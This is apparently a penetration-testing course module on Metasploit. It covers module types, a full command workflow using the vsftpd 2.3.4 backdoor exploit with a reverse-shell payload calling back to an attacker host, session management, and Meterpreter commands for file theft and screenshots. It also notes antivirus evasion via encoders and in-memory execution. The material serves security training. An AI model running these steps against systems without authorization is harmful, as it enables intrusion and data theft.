# Module 13 - Metasploit Fundamentals

## Why this comes right after firewall evasion
You now know how to scan past defenses, enumerate services, crack passwords, and get through firewalls. Metasploit is the framework that ties actual exploitation together in one organized system — everything before this module has been building toward being able to use it with real understanding, not just typing memorized commands.

---

## What Metasploit actually is
An open-source penetration testing framework that organizes exploits, payloads, and auxiliary tools into a single, searchable, scriptable interface — instead of manually downloading, compiling, and running dozens of separate exploit scripts, Metasploit provides a standardized structure for all of them.

**What it's for, attacker's perspective:** Massively reduces the time between "I found a vulnerable service and its exact version" and "I have a working exploit against it" — for known, publicly documented vulnerabilities, someone has often already written and tested a Metasploit module for it, meaning you're not writing exploit code from scratch each time.

---

## The Module Types — each one does a genuinely different job

**Exploits** — the actual code that takes advantage of a specific vulnerability to gain access.

**Payloads** — the code that *runs* once an exploit succeeds — this is the actual "what happens next" (a reverse shell, a Meterpreter session, adding a user account). The exploit is the door being opened; the payload is what walks through it.

**Auxiliary** — modules that don't directly exploit anything, but perform supporting actions: scanning, enumeration, fuzzing, denial of service testing. Many of the enumeration commands used in earlier modules (`search smb-version`, `search snmp_enum`) are auxiliary modules specifically.

**Encoders** — modify a payload's raw bytes to avoid containing "bad characters" (the exact same bad-character concept from the buffer overflow module) or to attempt evading basic antivirus/signature detection, without changing what the payload actually does once executed.

**NOPs** — generate "No Operation" instruction padding, used in exploit development (connects directly to the NOP sled concept from the buffer overflow module) to provide a landing buffer for shellcode.

**Post** — modules that run *after* successful exploitation, from within an existing session — gathering further information, escalating privileges, pivoting (covered in the next module).

---

## Basic Workflow, Command by Command

**Starting the framework:**
```
msfconsole
```

**Searching for a specific exploit — exactly matching your own notebook's workflow:**
```
search type:exploit name:vsftpd
search cve:2021-44228
search ProFTPD 1.3.5
```
Search supports multiple filter types — by name, by CVE ID directly (connecting back to the vulnerability assessment module), or a general keyword search across all module descriptions.

**Selecting a module:**
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
Or, using the numbered result from a search:
```
use 0
```

**Viewing what options a module needs configured:**
```
show options
```
This is the single most important habit-forming command in Metasploit — every module has different required and optional parameters, and skipping this step is the most common reason a module fails to run, not because it doesn't work, but because something required was never set.

**Setting required options:**
```
set RHOSTS <target-ip>
set RPORT 21
```
`RHOSTS` (remote host) and `RPORT` (remote port) are the two most universal options across nearly every module, though many modules have additional module-specific required fields visible via `show options`.

**Selecting and configuring a payload:**
```
show payloads
set payload unix/x86/shell_reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
```
`LHOST`/`LPORT` (local host/port) tell the payload where to connect *back to* — this is the reverse shell concept from the Netcat module, now handled automatically by the framework rather than manually.

**Verifying full configuration before firing:**
```
show options
```
Worth running again after setting the payload specifically, since selecting a payload often reveals additional payload-specific options (like `LHOST`/`LPORT`) that weren't visible before a payload was chosen.

**Executing:**
```
exploit
```
Or, equivalently:
```
run
```

---

## Managing Multiple Sessions

**Why sessions matter, and why exploiting multiple hosts isn't just "run exploit again":** in a real engagement, you're frequently juggling access to several compromised machines at once — Metasploit tracks each successful exploitation as a numbered, persistent session you can move between.

**Backgrounding a current session (returning to the main console without closing it):**
```
background
```

**Listing all active sessions:**
```
sessions -l
```

**Returning to a specific session by number:**
```
sessions -i 2
```

**Running a command across all active sessions simultaneously:**
```
sessions -c "whoami"
```
Genuinely useful when you have several compromised hosts and want to quickly check something consistent across all of them at once, rather than manually switching into each one individually.

---

## Meterpreter — the advanced payload, not just "a shell"

**Why Meterpreter is meaningfully different from a basic reverse shell:** a plain shell payload gives you command-line access, full stop. Meterpreter is an entire in-memory post-exploitation platform, offering built-in commands for file transfer, privilege escalation checks, screenshot capture, keylogging, pivoting (covered in the buffer overflow/pivoting module), and process manipulation — all through a purpose-built interface, without needing to rely on whatever native tools happen to already exist on the compromised machine.

**Why "in-memory" specifically matters:** Meterpreter runs entirely in the compromised process's memory rather than writing itself to disk as a file, making it significantly harder for traditional file-scanning antivirus to detect compared to a payload that has to exist as a saved executable somewhere.

**Basic Meterpreter commands, once a session is active:**
```
meterpreter > sysinfo        # basic system information
meterpreter > getuid         # current user context
meterpreter > ps             # list running processes
meterpreter > screenshot     # capture the current screen
meterpreter > download <file>  # pull a file from the target
meterpreter > upload <file>    # push a file to the target
meterpreter > shell            # drop into a native OS shell if needed
```

## Quick-reference table

| Module Type | Purpose |
|---|---|
| Exploit | Takes advantage of a specific vulnerability |
| Payload | What runs once the exploit succeeds |
| Auxiliary | Supporting actions — scanning, enumeration, DoS testing |
| Encoder | Modifies payload bytes to avoid bad characters/basic detection |
| Post | Runs after exploitation — further recon, privesc, pivoting |

| Command | Purpose |
|---|---|
| `search <term>` | Find a relevant module |
| `use <module>` | Select a module to work with |
| `show options` | See what needs to be configured |
| `set <OPTION> <value>` | Configure a required/optional parameter |
| `exploit` / `run` | Execute the configured module |
| `sessions -l` / `sessions -i <n>` | Manage multiple active sessions |
